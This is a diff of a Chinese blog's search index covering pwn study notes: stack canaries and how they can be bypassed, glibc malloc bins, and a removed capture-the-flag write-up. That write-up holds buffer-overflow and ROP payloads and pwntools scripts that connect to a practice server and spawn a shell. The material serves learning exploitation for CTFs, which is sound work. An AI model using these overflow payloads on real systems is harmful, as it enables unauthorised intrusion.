@@ -1,82 +1,40 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>bins</title>
-    <url>/2020/04/07/bins/</url>
-    <content><![CDATA[<blockquote>
-<p>bin是一个由<code>struct chunk</code>结构体组成的链表</p>
-<p> bin 用来管理被释放的<code>free chunk</code>，方便下次申请内存使用</p>
-<p> ptmalloc 一共维护了 128 个这样的 bin</p>
-</blockquote>
-<p><a href="https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/">malloc chunk</a></p>
-<h1 id="struct-chunk结构"><a href="#struct-chunk结构" class="headerlink" title="struct chunk结构"></a>struct chunk结构</h1><p>struct chunk结构体如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	 <span class="comment">//存放每个 fast chunk 链表头部的指针</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line"> 	<span class="comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+    <title>canary</title>
+    <url>/2019/11/08/canary/</url>
+    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
+<p><strong>Canary</strong></p>
+<p>Introduction</p>
+<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
+<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
+<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
+<p><strong>Canary 原理</strong></p>
+<p>在 GCC 中使用 Canary</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
 
-<p>可以看到有<code>fastbinsY</code>和<code>bins</code>两种bin数组</p>
-<h2 id="fastbinY"><a href="#fastbinY" class="headerlink" title="fastbinY"></a>fastbinY</h2><ul>
-<li><p>fastbinsY数组的bin主要回收32字节~128字节（0x20~0x80）的chunk，fastbin 最多可以支持的 bin 的个数为 10 个，</p>
-</li>
-<li><p>fastbin是单链表，只用到<code>fd</code>指针,遍历顺序是<code>LIFO</code>（后进先出）</p>
-</li>
-<li><p>prev_inuse位不置0,防止合并</p>
-<blockquote>
-<p>32位系统下</p>
-<p>第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist …</p>
-<p>chunk大小对应下标</p>
-<p>0          1        2         3         4          5        6          7          8        9</p>
-<p>0x10   0x18  0x20   0x28  0x30   0x38   0x40   0x48   0x50   0x58       32位</p>
-<p>0x20  0x30   0x40   0x50 0x60    0x70   0x80                                          64位</p>
-<p>但是不知道为什么fastbin有十个却好像只用了前七个（貌似与malloc初始化有关)</p>
-<p>在32位系统中，fastbin里chunk的大小范围从16到64；    –&gt;0x10到0x40</p>
-<p>在64位系统中，fastbin里chunk的大小范围从32到128;    –&gt;0x20到0x80</p>
-</blockquote>
-<p><img alt="fastbinY.png" data-src="https://i.loli.net/2020/04/08/NXfSmI3Q91ld8x6.png" class="lazyload"></p>
-<p>求fastbin的索引</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">    <span class="comment">//64位除16减去2，32位除8减去2</span></span><br></pre></td></tr></table></figure>
+<p><strong>Canary 实现原理</strong> </p>
+<p>开启 Canary 保护的 stack 结构大概如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
 
-</li>
-</ul>
-<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><ul>
-<li><p>bins数组中的第一个 bin 是 <code>unsorted bin</code>（1个），数组中从第 2 个到第 63 个 bin 是 <code>small bin</code>（62个），64到126为<code>large bin</code>（63个）</p>
-</li>
-<li><p>三种bin都是由free chunks组成的<code>循环双链表</code></p>
-</li>
-<li><p><code>unsortedbin</code>和<code>small bin</code>采用<code>FIFO</code>(先入先出)算法,</p>
-</li>
-<li><p><code>unsorted bin</code>中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中</p>
-</li>
-<li><p><code>small bin</code>中chunk的大小依次增加两个机器字长,与fastbin一样.不过bin有62个，chunk大小从<code>0x10</code>到<code>0x1f8</code>(32位)<code>0x20</code>到<code>0x3f0</code>（64位）</p>
-</li>
-<li><p><code>largin bin</code> 中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是<code>按从大到小排序</code>的,大的chunk放在一个链表的头部，最小的chunk放在尾部；相同大小的chunk按照最近使用顺序排序</p>
-</li>
-<li><p>在这63个<code>large bin</code>中，</p>
-<ul>
-<li><p>前32个大bin按以64字节步长为间隔，即第一个大bin中chunk大小为512〜575字节，第二个大bin中chunk大小为576〜 639字节。紧随其后的16个大bin先以512字节步长为间隔；</p>
-</li>
-<li><p>之后的8个bin以步长4096为间隔；</p>
-</li>
-<li><p>再之后的4个bin以32768字节为间隔；</p>
-</li>
-<li><p>之后的2个bin以262144字节为间隔；</p>
-</li>
-<li><p>剩下的chunk就放在最后一个大bin中。</p>
-</li>
-</ul>
-</li>
-</ul>
-<p>  <img alt="QQ截图20200408174926.png" data-src="https://i.loli.net/2020/04/08/e5KBEuVM3714tDn.png" class="lazyload"></p>
-<h2 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h2><blockquote>
-<p>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>堆</category>
-      </categories>
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>堆</tag>
-        <tag>bin</tag>
-        <tag>linux</tag>
-        <tag>malloc</tag>
+        <tag>保护机制</tag>
       </tags>
   </entry>
   <entry>
@@ -151,46 +109,88 @@
         <category>堆</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>malloc</tag>
         <tag>chunk结构</tag>
+        <tag>malloc</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
-    <title>canary</title>
-    <url>/2019/11/08/canary/</url>
-    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
-<p><strong>Canary</strong></p>
-<p>Introduction</p>
-<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
-<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
-<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
-<p><strong>Canary 原理</strong></p>
-<p>在 GCC 中使用 Canary</p>
-<p>可以在 GCC 中使用以下参数设置 Canary:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
+    <title>bins</title>
+    <url>/2020/04/07/bins/</url>
+    <content><![CDATA[<blockquote>
+<p>bin是一个由<code>struct chunk</code>结构体组成的链表</p>
+<p> bin 用来管理被释放的<code>free chunk</code>，方便下次申请内存使用</p>
+<p> ptmalloc 一共维护了 128 个这样的 bin</p>
+</blockquote>
+<p><a href="https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/">malloc chunk</a></p>
+<h1 id="struct-chunk结构"><a href="#struct-chunk结构" class="headerlink" title="struct chunk结构"></a>struct chunk结构</h1><p>struct chunk结构体如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	 <span class="comment">//存放每个 fast chunk 链表头部的指针</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line"> 	<span class="comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p><strong>Canary 实现原理</strong> </p>
-<p>开启 Canary 保护的 stack 结构大概如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+<p>可以看到有<code>fastbinsY</code>和<code>bins</code>两种bin数组</p>
+<h2 id="fastbinY"><a href="#fastbinY" class="headerlink" title="fastbinY"></a>fastbinY</h2><ul>
+<li><p>fastbinsY数组的bin主要回收32字节~128字节（0x20~0x80）的chunk，fastbin 最多可以支持的 bin 的个数为 10 个，</p>
+</li>
+<li><p>fastbin是单链表，只用到<code>fd</code>指针,遍历顺序是<code>LIFO</code>（后进先出）</p>
+</li>
+<li><p>prev_inuse位不置0,防止合并</p>
+<blockquote>
+<p>32位系统下</p>
+<p>第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist …</p>
+<p>chunk大小对应下标</p>
+<p>0          1        2         3         4          5        6          7          8        9</p>
+<p>0x10   0x18  0x20   0x28  0x30   0x38   0x40   0x48   0x50   0x58       32位</p>
+<p>0x20  0x30   0x40   0x50 0x60    0x70   0x80                                          64位</p>
+<p>但是不知道为什么fastbin有十个却好像只用了前七个（貌似与malloc初始化有关)</p>
+<p>在32位系统中，fastbin里chunk的大小范围从16到64；    –&gt;0x10到0x40</p>
+<p>在64位系统中，fastbin里chunk的大小范围从32到128;    –&gt;0x20到0x80</p>
+</blockquote>
+<p><img alt="fastbinY.png" data-src="https://i.loli.net/2020/04/08/NXfSmI3Q91ld8x6.png" class="lazyload"></p>
+<p>求fastbin的索引</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">    <span class="comment">//64位除16减去2，32位除8减去2</span></span><br></pre></td></tr></table></figure>
 
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
-<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
-
-<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
+</li>
+</ul>
+<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><ul>
+<li><p>bins数组中的第一个 bin 是 <code>unsorted bin</code>（1个），数组中从第 2 个到第 63 个 bin 是 <code>small bin</code>（62个），64到126为<code>large bin</code>（63个）</p>
+</li>
+<li><p>三种bin都是由free chunks组成的<code>循环双链表</code></p>
+</li>
+<li><p><code>unsortedbin</code>和<code>small bin</code>采用<code>FIFO</code>(先入先出)算法,</p>
+</li>
+<li><p><code>unsorted bin</code>中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中</p>
+</li>
+<li><p><code>small bin</code>中chunk的大小依次增加两个机器字长,与fastbin一样.不过bin有62个，chunk大小从<code>0x10</code>到<code>0x1f8</code>(32位)<code>0x20</code>到<code>0x3f0</code>（64位）</p>
+</li>
+<li><p><code>largin bin</code> 中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是<code>按从大到小排序</code>的,大的chunk放在一个链表的头部，最小的chunk放在尾部；相同大小的chunk按照最近使用顺序排序</p>
+</li>
+<li><p>在这63个<code>large bin</code>中，</p>
+<ul>
+<li><p>前32个大bin按以64字节步长为间隔，即第一个大bin中chunk大小为512〜575字节，第二个大bin中chunk大小为576〜 639字节。紧随其后的16个大bin先以512字节步长为间隔；</p>
+</li>
+<li><p>之后的8个bin以步长4096为间隔；</p>
+</li>
+<li><p>再之后的4个bin以32768字节为间隔；</p>
+</li>
+<li><p>之后的2个bin以262144字节为间隔；</p>
+</li>
+<li><p>剩下的chunk就放在最后一个大bin中。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>  <img alt="QQ截图20200408174926.png" data-src="https://i.loli.net/2020/04/08/e5KBEuVM3714tDn.png" class="lazyload"></p>
+<h2 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h2><blockquote>
+<p>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>堆</category>
+      </categories>
       <tags>
-        <tag>保护机制</tag>
+        <tag>malloc</tag>
+        <tag>linux</tag>
+        <tag>堆</tag>
+        <tag>bin</tag>
       </tags>
   </entry>
   <entry>
@@ -316,66 +316,6 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       </tags>
   </entry>
   <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python基本数据类型</title>
     <url>/2019/08/08/python/</url>
     <content><![CDATA[<a id="more"></a>
@@ -480,75 +420,6 @@ for key in info:
       </tags>
   </entry>
   <entry>
-    <title>stack2</title>
-    <url>/2019/10/11/stack2/</url>
-    <content><![CDATA[<p>1.file命令查看为32位</p>
-<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
-<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
-<p>3.做题首先运行一下，查看程序的运行过程</p>
-<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
-<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
